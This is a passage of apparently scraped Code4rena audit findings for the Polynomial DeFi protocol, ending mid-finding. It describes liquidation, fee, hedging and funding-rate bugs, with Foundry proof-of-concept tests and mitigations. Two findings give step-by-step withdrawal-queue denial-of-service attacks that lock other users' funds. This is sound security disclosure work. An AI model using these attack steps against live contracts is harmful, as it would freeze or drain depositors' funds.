[{"title": "Short positions with minimum collateral can be liquidated even though `canLiquidate()` returns `false`", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/146", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L235   # Vulnerability details  ## Impact  Frontends or contracts that rely on `canLiquidate()` to determine if a position is liquidatable could be incorrect. Users could think their positions are safe from liquidation even though they are liquidatable, leading to them losing their collateral.  ## Vulnerability Details  In the `ShortCollateral` contract, `canLiquidate()` determines if a short position can be liquidated using the following formula:  [ShortCollateral.sol#L207-L210](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L207-L210)  ```solidity uint256 minCollateral = markPrice.mulDivUp(position.shortAmount, collateralPrice); minCollateral = minCollateral.mulWadDown(collateral.liqRatio);  return position.collateralAmount < minCollateral; ```  Where: * `position.collateralAmount` - Amount of collateral in the short position. * `minCollateral` - Minimum amount of collateral required to avoid liquidation.  From the above, a short position can be liquidated if its collateral amount is **less than** `minCollateral`. This means a short position with the minimum collateral amount (ie. `position.collateralAmount == minCollateral`)  cannot be liquidated.   However, this is not the case in `maxLiquidatableDebt()`, which is used to determine a position's maximum liquidatable debt:  [ShortCollateral.sol#L230-L237](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L230-L237)  ```solidity uint256 safetyRatioNumerator = position.collateralAmount.mulWadDown(collateralPrice); uint256 safetyRatioDenominator = position.shortAmount.mulWadDown(markPrice); safetyRatioDenominator = safetyRatioDenominator.mulWadDown(collateral.liqRatio); uint256 safetyRatio = safetyRatioNumerator.divWadDown(safetyRatioDenominator);  if (safetyRatio > 1e18) return maxDebt;  maxDebt = position.shortAmount / 2; ```  Where: * `safetyRatio` - Equivalent to `position.collateralAmount / minCollateral`. Can be seen as a position's collateral amount against the minimum collateral required.   * `maxDebt` - The amount of debt liquidatable. Defined as 0 at the start of the function.  As seen from the `safetyRatio > 1e18` check, a position is safe from liquidation (ie. `maxDebt = 0`) if  its `safetyRatio` is **greater than** 1.   Therefore, as a position with the minimum collateral amount has a `safetyRatio` of 1, half its debt becomes liquidatable. This contradicts `canLiquidate()`, which returns `false` for such positions.  ## Proof of Concept  The following test demonstrates how a position with minimum collateral is liquidatable even though `canLiquidate()` returns `false`: ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.9;  import {TestSystem, Exchange, ShortToken, ShortCollateral, PowerPerp, MockERC20Fail} from \"./utils/TestSystem.sol\";  contract CanLiquidateIsInaccurate is TestSystem {     // Protocol contracts     Exchange private exchange;     ShortToken private shortToken;     ShortCollateral private shortCollateral;          // sUSD token contract     MockERC20Fail private SUSD;          function setUp() public {           // Set liquidation ratio of sUSD to 125%           susdLiqRatio = 1.24e18;          // Deploy contracts         deployTestSystem();         initPool();         initExchange();         preparePool();          exchange = getExchange();         shortToken = getShortToken();         shortCollateral = getShortCollateral();         SUSD = getSUSD();          // Mint sUSD for user_1         SUSD.mint(user_1, 1e20);          // Mint powerPerp for user_2         vm.prank(address(exchange));         getPowerPerp().mint(user_2, 1e20);     }      function testCanLiquidateMightBeWrong() public {         // Initial price of base asset is 1e18         uint256 initialPrice = 1e18;         setAssetPrice(initialPrice);          // Open short position with 1e15 sUSD as collateral         Exchange.TradeParams memory tradeParams;         tradeParams.amount = 1e18;         tradeParams.collateral = address(SUSD);         tradeParams.collateralAmount = 1e15;         tradeParams.minCost = 0;          vm.startPrank(user_1);         SUSD.approve(address(exchange), tradeParams.collateralAmount);         (uint256 positionId,) = exchange.openTrade(tradeParams);         vm.stopPrank();                 // Initial price of base asset increases, such that minCollateral == collateralAmount         setAssetPrice(1270001270001905664);          // canLiquidate() returns false         assertFalse(shortCollateral.canLiquidate(positionId));          // However, maxLiquidatableDebt() returns half of original amount         assertEq(shortCollateral.maxLiquidatableDebt(positionId), tradeParams.amount / 2);          // Other users can liquidate the short position         vm.prank(user_2);         exchange.liquidate(positionId, tradeParams.amount);          // Position's shortAmount and collateral is reduced         (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);         assertEq(remainingAmount, tradeParams.amount / 2);         assertLt(remainingCollateralAmount, tradeParams.collateralAmount);     } } ```  ## Recommended Mitigation  Consider making short positions safe from liquidation if their `safetyRatio` equals to 1:  [ShortCollateral.sol#L235](https://github.com/code-423n4/2023-03-polynomial/blob/main/src/ShortCollateral.sol#L235) ```diff -        if (safetyRatio > 1e18) return maxDebt; +        if (safetyRatio >= 1e18) return maxDebt; ```"}, {"title": "Excessive trading fees can result in 99.9% collateral loss for the trader", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/129", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-09"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L367-L374 https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L141 https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/test/utils/TestSystem.sol#L202   # Vulnerability details  ## Impact  This issue can lead to traders losing all their collateral due to excessive fees when opening and closing larger trades.  ## Proof of Concept  When the exchange opens/closes trades, it defines the order fees to be paid by the user using the `orderFee` function. The function takes into account both the hedging fee, which covers the cost of managing the risk associated with holding the position, and the trading fee, which accounts for the costs incurred when executing the trade.  The function works as follows: 1.  It first calculates the `delta`, a factor representing the rate at which the position size changes. 2.  Then, it computes the `futuresSizeDelta` by multiplying the input `sizeDelta` with the calculated `delta`. 3.  It calls the `perpMarket.orderFee` function to get the `hedgingFee` and a boolean flag, `isInvalid`, which indicates if the trade is invalid. 4.  It checks if the trade is valid by ensuring `isInvalid` is not set to `true`. If the trade is invalid, it will throw an exception. 5.  It retrieves the `markPrice` from the `exchange.getMarkPrice` function, which represents the current market price of the asset. 6.  The function calculates the `valueExchanged` by multiplying the `markPrice` with the absolute value of `sizeDelta`. This represents the total value of the trade. 7.  It computes the `tradeFee` using the `getSlippageFee` function, which calculates the fee based on the size of the trade. 8.  The `tradingFee` is calculated by multiplying the `tradeFee` with `valueExchanged`. 9.  Finally, the function returns the sum of the `hedgingFee` and `tradingFee` as the total fee for the trade.  By combining both the hedging fee and trading fee, the `orderFee` function comprehensively calculates the costs associated for the trade.  The problem here lies in the [getSlippageFee](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L367-L374) function.  The purpose of the `getSlippageFee` function is to calculate the slippage fee for a trade based on the change in position size, represented by the input `sizeDelta`. The slippage fee is a cost associated with executing a trade that accounts for the potential price impact and liquidity changes due to the size of the order. It helps ensure that the trading platform can effectively manage the impact of large trades on the market.  ```solidity      function getSlippageFee(int256 sizeDelta) public view returns (uint256) {         // ceil(s/100) * baseFee          uint256 size = sizeDelta.abs();         uint256 region = size / standardSize;          if (size % standardSize != 0) region += 1;         return region * baseTradingFee;     } ```  The function works as follows:  1.  It first calculates the absolute value of `sizeDelta` to ensure the size is a positive value, regardless of whether the trade is a buy or sell. 2.  It then divides the `size` by `standardSize` ([set by default to](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L142) 1e20), to determine the number of regions the trade occupies. This constant value represents the size of a \"standard\" trade, which is used to categorize trades into different regions based on their size. 3.  If there is a remainder after dividing `size` by the constant value, it increments the `region` by 1. This ensures that even partial regions are taken into account when calculating the fee. 4.  Finally, the function calculates the slippage fee by multiplying the `region` with `baseTradingFee` (currently [set](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/test/utils/TestSystem.sol#L202) to 6e15 in the test suite). This constant value represents the base fee for each region.  By calculating the slippage fee based on the size of the trade, the `getSlippageFee` function helps account for the potential impact of the trade on the market. The larger the trade, the more regions it occupies, resulting in a higher slippage fee. This approach incentivizes traders to be mindful of the size of their trades and the potential impact they may have on market liquidity and pricing.  The issue is that region can get really big (depending on the trade) so that the openTrade/closeTrades `orderFee` could >= 100% meaning all the collateral of the user will be used to pay taxes.  While I completely understand the intent of higher taxes for bigger trades, I think there should be a limit where the trade won't get opened if a certain threshold is passed.  I've built a PoC with Foundry using the protocol test suite with a few comments here and there to represent the following cases:  https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/test/Exchange.Simple.t.sol#L100-L145  ```solidity     function depositToPool(address user, uint256 sum) internal {         susd.mint(user, sum);         vm.startPrank(user);         susd.approve(address(pool), sum);         pool.deposit(sum, user);         vm.stopPrank();     }      function openShort(uint256 amount, uint256 collateral, address user)         internal         returns (uint256 positionId, Exchange.TradeParams memory tradeParams)     {         tradeParams.amount = amount;         tradeParams.collateral = address(susd);         tradeParams.collateralAmount = collateral;         tradeParams.minCost = 0;          vm.startPrank(user);         susd.approve(address(exchange), collateral);         (positionId,) = exchange.openTrade(tradeParams);         vm.stopPrank();     }       function testSimpleShortCloseTrade() public {         depositToPool(user_2, 1000e18 * 25000);         uint256 pricingConstant = exchange.PRICING_CONSTANT();         uint256 expectedPrice = initialPrice.mulDivDown(initialPrice, pricingConstant);         uint256 multiplier = 165;         uint256 collateralAmount = (expectedPrice * 2) * multiplier; // 200% Collateral ratio         uint256 shortAmount = multiplier * 1e18;         susd.mint(user_1, collateralAmount);         console.log(\"CollateralAmount\", collateralAmount / 1e18);         console.log(\"ShortAmount\", shortAmount / 1e18);         console.log(\"User_1 sUSD balance\", susd.balanceOf(user_1) / 1e18);           console.log(\"*** OPEN TAX ***\");         (uint256 positionId,) = openShort(shortAmount, collateralAmount, user_1);         console.log(\"*** OPEN TAX ***\\n\");          console.log(\"*** CLOSE TAX ***\");         closeShort(positionId, shortAmount, type(uint256).max, collateralAmount, user_1);         console.log(\"*** CLOSE TAX ***\");          console.log(\"User_1 sUSD balance\", susd.balanceOf(user_1) / 1e18);     } ```  I'm going to use the formula `(orderFee * 2) / collateralAmount` to calculate the tax percentage. For each case, I'll just modify the `multiplier` variable.  Case 1: (multiplier 165) CollateralAmount 237600 ShortAmount 165 The tax % is: 1,7996633  Running the tests, yields the following results.  ![](https://i.imgur.com/Okrd9EI.png)   Case 2: (multiplier 1650) CollateralAmount 2376000 ShortAmount 1650 The tax % is: 10,8  Running the tests yields the following results.  ![](https://i.imgur.com/PYcc26N.png)   Case 3: (multiplier 16500) CollateralAmount 23760000 ShortAmount 16500 The tax % is: 99,6  ![](https://i.imgur.com/OxLYyTp.png)   Case 3 proves the point that a user can potentially lose all his collateral just by paying taxes when opening/closing a trade.  ## Tools Used  Manual review, Foundry   ## Recommended Mitigation Steps  This invariant is heavily influenced by the calculation right [here](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L371). In case 1 the region is 1, in case 2 is 16 and in case 3 is 165.  To address this issue, a protocol-wide maximum amount of taxes to be paid in a trade (total of open + close) should be established. If the calculated fee exceeds this threshold, the transaction should be reverted instead of opening the trade for the user. This will help protect traders from losing all their collateral due to excessive trading fees."}, {"title": "The Liquidity Pool will lack margin of Synthetix perpetual market, if `liquidationBufferRatio` of contract `PerpsV2MarketSettings` from Synthetix is updated", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/120", "labels": ["bug", "2 (Med Risk)", "judge review requested", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L764-L771   # Vulnerability details  ## Impact The Liquidity Pool can lack the margin of PerpMarket if `liquidationBufferRatio` of contract `PerpsV2MarketSettings` from Synthetix is greater than 1e18. Then the delay orders of the pool can not be executed and the position of the pool might be liquidated. ## Proof of concept * Function `_calculateMargin` returns the margin amount needed to transfer with the specific size of PerpMarket. ```solidity= function _calculateMargin(int256 size) internal view returns (uint256 margin) {     (uint256 spotPrice, bool isInvalid) = baseAssetPrice();      require(!isInvalid || spotPrice > 0);      uint256 absSize = size.abs();     margin = absSize.mulDivDown(spotPrice, futuresLeverage); } ```  * When LiquidityPool executes a delayed order of Synthetix, function [`_updatePositionMargin`](https://github.com/Synthetixio/synthetix/blob/v2.84.3-alpha/contracts/PerpsV2MarketProxyable.sol#L133) from PerpsV2Market of Synthetix will be called. It will check the margin of the new position in the perps market: ```solidity= uint liqPremium = _liquidationPremium(position.size, price); uint liqMargin = _liquidationMargin(position.size, price).add(liqPremium); _revertIfError(     (margin < _minInitialMargin()) ||         (margin <= liqMargin) ||         (_maxLeverage(_marketKey()) < _abs(_currentLeverage(position, price, margin))),     Status.InsufficientMargin ); ``` * Function [`_liquidationMargin`](https://github.com/Synthetixio/synthetix/blob/v2.84.3-alpha/contracts/PerpsV2MarketBase.sol#L390) returns the maximum of margin that will be liquidated with the position size of perps market. Then the new margin must to be greater than `_liquidationMargin`. ```solidity=  function _liquidationMargin(int positionSize, uint price) internal view returns (uint lMargin) {     uint liquidationBuffer = _abs(positionSize).multiplyDecimal(price).multiplyDecimal(_liquidationBufferRatio());     return liquidationBuffer.add(_liquidationFee(positionSize, price)); } ``` * To calculate the `_liquidationMargin`, PerpsV2Martket use the variable [`_liquidationBufferRatio`](https://github.com/Synthetixio/synthetix/blob/v2.84.3-alpha/contracts/MixinPerpsV2MarketSettings.sol#L171) as the scale of `_abs(positionSize).multiplyDecimal(price)` (value of the position). This variable has getter and setter functions in the contract [`PerpsV2MarketSettings`](https://github.com/Synthetixio/synthetix/blob/v2.84.3-alpha/contracts/PerpsV2MarketSettings.sol). You can find this contract at https://optimistic.etherscan.io/address/0x09793Aad1518B8d8CC72FDd356479E3CBa7B4Ad1#code.  * `_liquidationBufferRatio` is 1e16 (1%) now but can be changed in the future, and can become market-specific (I asked Synthetix team and they said it will be changed in a couple of weeks, but I didn't know how it will be changed). * Since function `_calculateMargin` in contract LiquidityPool doesn't consider this minimum required margin (to not be liquidated), LiquidityPool can lack the margin of perps market in the future.  * Scenario:  1. `futuresLeverage` of LiquidityPool is applied to be 5.Then function `_calculateMargin` returns 1/5 (20%) amount of position value (position value = size * spotPrice) 2. `_liquidationBufferRatio` is set to be 3e17 (30%) in `PerpsV2MarketSettings` contract. Then it requires a margin >= 30% of the position value when updating a position. 3. LiquidityPool's margin is not enough for its position in PerpsMarket. Then the delay orders of the pool can't be executed and the position of the pool in PerpsMarket can be liquidated ## Tool used  Manual Review  ## Recommended Mitigation Steps Should calculate `_liquidationMargin` from PerpsMarket using the current `_liquidationBufferRatio` from `PerpsV2MarketSettings` contract, to set the minimum margin in function `_calculateMargin`"}, {"title": "Function `hedgePositions` is incorrect, because it missed the `queuedPerpSize` in the calculation", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/113", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-10"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L568-L587   # Vulnerability details  ## Impact Function `hedgePositions` is incorrect, leads to the hedging will not work as expected, and LiquidityPool can lose funds without expectation. ## Proof of concept Let's see function `hedgePositions` in LiquidtyPool contract: ```solidity= function hedgePositions() external override requiresAuth nonReentrant {     int256 currentPosition = _getTotalPerpPosition();     int256 skew = _getSkew();     uint256 delta = _getDelta();     int256 requiredPosition = wadMul(skew, int256(delta));      int256 newPosition = requiredPosition - currentPosition;     int256 marginDelta = int256(_calculateMargin(newPosition));      if (requiredPosition.abs() < currentPosition.abs()) {         marginDelta = -marginDelta;     }      usedFunds += marginDelta;      perpMarket.transferMargin(marginDelta);     _placeDelayedOrder(newPosition, false);      emit HedgePositions(currentPosition, requiredPosition, marginDelta); } ``` `currentPosition` is the sum of: the current position size of Liquidity Pool in Synthetix and the delta size of the current delayed order which was submitted into Synthetix perp market. ```solidity= ///url = https://github.com/code-423n4/2023-03-polynomial/blob/main/src/LiquidityPool.sol#L738-L743 function _getTotalPerpPosition() internal view returns (int256 positionSize) {     IPerpsV2MarketBaseTypes.Position memory position = perpMarket.positions(address(this));     IPerpsV2MarketBaseTypes.DelayedOrder memory delayedOrder = perpMarket.delayedOrders(address(this));      positionSize = position.size + delayedOrder.sizeDelta; } ``` However, `currentPosition` missed the variable `queuedPerpSize`, is the total amount of pending size delta (waiting to be submitted). Then `_placeDelayedOrder` will be called with the wrong `newPosition`, leads to the position size of pool can get a large deviation. The hedging will not be safe anymore.  **Scenerio:** * `_getTotalPerpPosition` = 0,    `requiredPosition` = 1000,      `queuedPerpSize` = 1000 * `newPosition` is calculated incorrectly to be 1000 (since it missed `queuedPerpSize`) * It calls `_placeDelayedOrder(1000, false)`, then `queuedPerpSize` increase to be 2000 * After executing all delayed orders, position size of LiquidityPool = 2000 (incorrect hedging) * `newPosition` should be -1000 in this case ## Tool used  Manual Review  ## Recommended Mitigation Steps `currentPosition` should be `_getTotalPerpPosition()` + `queuedPerpSize` in function `hedgePositions`"}, {"title": "KangarooVault QueuedWithdraw Denial of Service", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/105", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "edited-by-warden", "H-11"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L269-L333   # Vulnerability details  ## Impact  When the KangarooVault has an open position, any withdrawals that are initiated, are queued.  QueuedWithdrawals work in two steps. 1. A user initialtes the Withdrawal via [initiateWithdrawal](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L215). This burns the `VaultToken` and [if (positionData.positionId != 0)](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L225) adds the request to the `withdrawalQueue`. 2. `processWithdrawalQueue()` can be called to process requests in the `withdrawalQueue` that have passed `minWithdrawDelay` to transfer the SUSD tokens to the user.  If the processing of a `QueuedWithdraw` entry in the `withdrawalQueue` reverts, the [queuedWithdrawalHead](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L331) will never increase and further processing of the queue will be impossible. This means that any users that have placed a QueuedWithdraw after the reverting entry will have lost their vaultToken without receiving their SUSD.  ## Proof of Concept When calling the `initiateWithdrawal()` function, the user can provide an address of the receiver of funds. When processing the withdrawal queue, the contracts does all the required checks, and then [transfers the SUSD](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/KangarooVault.sol#L322) to the provided user.   If we look at the [Synthetix sUSD token](https://optimistic.etherscan.io/address/0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9) and it's [target implementation](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code) we will find that the SUSD token transfer code is:  [sUSD MultiCollateralSynth:L723-L739](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code) ```solidity  function _internalTransfer(     address from,     address to,     uint value ) internal returns (bool) {     /* Disallow transfers to irretrievable-addresses. */     require(to != address(0) && to != address(this) && to != address(proxy), \"Cannot transfer to this address\");      // Insufficient balance will be handled by the safe subtraction.     tokenState.setBalanceOf(from, tokenState.balanceOf(from).sub(value));     tokenState.setBalanceOf(to, tokenState.balanceOf(to).add(value));      // Emit a standard ERC20 transfer event     emitTransfer(from, to, value);      return true; } ``` This means any SUSD transfer to the SUSD proxy or implementation contract, will result in a revert. An attacker can use this to make a `initiateWithdrawal()` request with `user=sUSDproxy` or `user=sUSD_MultiCollateralSynth`.   Any user that request a Withdrawal via `initiateWithdrawal()` after this, will lose their vault tokens without receiving their SUSD. The attacker can do this at any time, or by frontrunning a specific (large) `initiateWithdrawal()` request.  To test it, a check is added to the mock contract that is used for SUSD in the test scripts: ```diff  diff --git a/src/test-helpers/MockERC20Fail.sol b/src/test-helpers/MockERC20Fail.sol index e987f04..1ce10ec 100644 --- a/src/test-helpers/MockERC20Fail.sol +++ b/src/test-helpers/MockERC20Fail.sol @@ -18,6 +18,9 @@ contract MockERC20Fail is MockERC20 {      }       function transfer(address receiver, uint256 amount) public override returns (bool) { + +        require(receiver != address(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB) , \"Cannot transfer to this address\"); +          if (forceFail) {              return false;          } ```  In the [KangarooVault.t.sol](https://github.com/code-423n4/2023-03-polynomial/blob/main/test/KangarooVault.t.sol) test script, the following test was added to demonstrated the issue:  ```solidity // add to top of file: import {IVaultToken} from \"../../src/interfaces/IVaultToken.sol\";   // add to KangarooTest Contract:     function testWithdrawalDOS() public {          IVaultToken vault_token = kangaroo.VAULT_TOKEN();         // make deposit for user_2         susd.mint(user_2, 2e23);         vm.startPrank(user_2);         susd.approve(address(kangaroo), 2e23);         kangaroo.initiateDeposit(user_2, 2e23);         assertEq(vault_token.balanceOf(user_2),2e23);         vm.stopPrank();           // have vault open a position to force queued wthdrawals         testOpen();          // vault has  position opened, withdrawal will be queued, vault_token burned, no USDC received         vm.startPrank(user_2);         kangaroo.initiateWithdrawal(user_2, 1e23);         assertEq(susd.balanceOf(user_2),0);         assertEq(vault_token.balanceOf(user_2),1e23);                  // process withdrawalqueue, withdrawam should pass         skip(kangaroo.minWithdrawDelay());                  kangaroo.processWithdrawalQueue(3);         uint256 user_2_balance = susd.balanceOf(user_2);         assertGt(user_2_balance,0);                 vm.stopPrank();           // user 3 frontruns with fake/reverting withdrawal request.         // to 0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB (= SUSD MultiCollateralSynth contract address).          // This will cause SUSD transfer to revert.         vm.startPrank(user_3);                 kangaroo.initiateWithdrawal(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB, 0);         vm.stopPrank();          // user_2 adds another withdrawal request, after the attackers request, vault_token burned, no USDC received         vm.startPrank(user_2);           kangaroo.initiateWithdrawal(user_2, 1e23);         assertEq(vault_token.balanceOf(user_2),0);           // processWithdrawalQueue now reverts and no funds received         skip(kangaroo.minWithdrawDelay());         vm.expectRevert(bytes(\"TRANSFER_FAILED\"));         kangaroo.processWithdrawalQueue(3);         assertEq(susd.balanceOf(user_2),user_2_balance);         assertEq(vault_token.balanceOf(user_2),0);         vm.stopPrank();      }  ```  ## Tools Used Manual review, forge  ## Recommended Mitigation Steps The processing of withdrawalQueue should have a mechanism to handle reverting QueuedWithdraw entries. Either by skipping them and/or moving them to another `failedWithdrawals` queue. "}, {"title": "Denial of service of Liquiditypool QueuedWithdrawals", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/103", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "upgraded by judge", "edited-by-warden", "H-12"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L264-L333   # Vulnerability details  ## Impact  The preferred way for withdrawals of the Liquiditypool is to do this via a withdrawal queue. According to Polynomial  >  Queuing will be the default deposit/withdraw mechanism (In the UI) and not planning to charge any fees for this mechanism   > Instant deposit / withdraw is mechanism is meant for external integrations in case if they don't want to track status of the queued deposit or withdraw  It is also stimulated to use `queueWithdraw()` over `withdraw()` by charging a withdrawalFee for direct withdrawals.  QueuedWithdrawals work in two steps. 1. A user initialtes the Withdrawal via `queueWithdraw()`. This burns the `liquidityTokens` and adds the request to the `withdrawalQueue`. 2. `processWithdraws()` can be called to process requests in the `withdrawalQueue` that have passed `minWithdrawDelay` to transfer the SUSD tokens to the user.  If the processing of a `QueuedWithdraw` in the `withdrawalQueue` reverts, the [queuedWithdrawalHead](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#LL331C13-L331C33) will never increase and further processing of the queue will be impossible. This means that any users that have placed a QueuedWithdraw after the reverting entry will have lost their liquiditytokens without receiving their SUSD.  ## Proof of Concept When calling the `queueWithdraw()` function, the user can provide an address of the receiver of funds. When processing the withdrawal queue, the contracts does all the required checks, and then [transfers the SUSD](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/LiquidityPool.sol#L311) to the provided user.   If we look at the [Synthetix sUSD token](https://optimistic.etherscan.io/address/0x8c6f28f2F1A3C87F0f938b96d27520d9751ec8d9) and it's [target implementation](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code) we will find that the SUSD token transfer code is:  [sUSD MultiCollateralSynth:L723-L739](https://optimistic.etherscan.io/address/0xdfa2d3a0d32f870d87f8a0d7aa6b9cdeb7bc5adb#code) ```solidity      function _internalTransfer(         address from,         address to,         uint value     ) internal returns (bool) {         /* Disallow transfers to irretrievable-addresses. */         require(to != address(0) && to != address(this) && to != address(proxy), \"Cannot transfer to this address\");          // Insufficient balance will be handled by the safe subtraction.         tokenState.setBalanceOf(from, tokenState.balanceOf(from).sub(value));         tokenState.setBalanceOf(to, tokenState.balanceOf(to).add(value));          // Emit a standard ERC20 transfer event         emitTransfer(from, to, value);          return true;     } ``` This means any transfer to the SUSD proxy or implementation contract, will result in a revert. An attacker can use this to make `queueWithdraw()` request with `user=sUSDproxy` or `user=sUSD_MultiCollateralSynth`.   Any user that request a Withdrawal via `queueWithdraw()` after this, will lose their liquidity tokens without receiving their SUSD. The attacker can do this at any time, or by frontrunning a specific (large) `queueWithdraw()` request.  To test it, a check is added to the mock contract that is used for SUSD in the test scripts to simulate the SUSD contract behaviour: ```diff  diff --git a/src/test-helpers/MockERC20Fail.sol b/src/test-helpers/MockERC20Fail.sol index e987f04..1ce10ec 100644 --- a/src/test-helpers/MockERC20Fail.sol +++ b/src/test-helpers/MockERC20Fail.sol @@ -18,6 +18,9 @@ contract MockERC20Fail is MockERC20 {      }       function transfer(address receiver, uint256 amount) public override returns (bool) { + +        require(receiver != address(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB) , \"Cannot transfer to this address\"); +          if (forceFail) {              return false;          } ```  In the test/LiquidityPool.Deposits.t.sol test file, the following was added. This results in a revert of the processWithdraws function and failing the test ```diff  iff --git a/test/LiquidityPool.Deposits.t.sol b/test/LiquidityPool.Deposits.t.sol     index 0bb6f5f..8d70c60 100644 --- a/test/LiquidityPool.Deposits.t.sol +++ b/test/LiquidityPool.Deposits.t.sol @@ -291,6 +291,9 @@ contract LiquidityPoolTest is TestSystem {          // user_2 i-withdraw 20$          // user_3 q-withdraw 13$  +        // Frontrun all withdrawal requests, since amount =0, can be called by anyone +        pool.queueWithdraw(0, 0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB); +          vm.prank(user_1);          pool.queueWithdraw(2e19, user_1);          vm.prank(user_3);  ```  ## Tools Used Manual review, forge  ## Recommended Mitigation Steps The processing of withdrawalQueue should have a mechanism to handle reverting QueuedWithdraw entries. Either by skipping them and/or moving them to another `failedWithdrawals` queue."}, {"title": "Exchange: totalFunding calculation should be done with a simple multiplication operation instead of a `wadMul` operation", "html_url": "https://github.com/code-423n4/2023-03-polynomial-findings/issues/101", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-13"], "target": "2023-03-polynomial-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L196 https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L416   # Vulnerability details  ## Description `wad` operations are meant to be done with int/uint which represent numbers with 18 decimals.  While the funding rate follows this representation, a simple time difference does not.  In `Exchange.getMarkPrice` as well as in `Exchange._updateFundingRate` a `wadMul` operation is done to multiply the funding rate per second by a simple time difference, leading to wrong calculation of `normalizationFactor` and mark price, affecting critical parts of the protocol  ## POC In `Exchange.getMarkPrice` first we get the funding rate per second: ```solidity (int256 fundingRate,) = getFundingRate(); fundingRate = fundingRate / 1 days; // Funding rate per second ```  Immediately after, the total funding since last update is calculated:  ```solidity int256 currentTimeStamp = int256(block.timestamp);         int256 fundingLastUpdatedTimestamp = int256(fundingLastUpdated);          // @audit funding rate X (time interval) / 1e18 = Number without decimal         int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp)); ``` `int256 totalFunding = wadMul(fundingRate, (currentTimeStamp - fundingLastUpdatedTimestamp));` is the same that $TOTAL\\_ FUNDING_{t_{1}; t_{2}} = \\frac{FUNDING\\_ RATE_{sec} \\times (t_{2} - t_{1})}{10^{18}}$  However, the division by $10^{18}$ should not happen, given that time difference does not represent a number with 18 decimals.  This ends up in a miscalculation of `totalFunding` variable, and as a consequence, a miscalculation of mark price  The same issue happens in `_updateFundingRate` function  ## Impact  Here a complete list of function affected by this bug: 1. [Exchange._updateFundingRate](https://github.com/code-423n4/2023-03-polynomial/blob/aeecafc8aaceab1ebeb94117459946032ccdff1e/src/Exchange.sol#L416)     1. 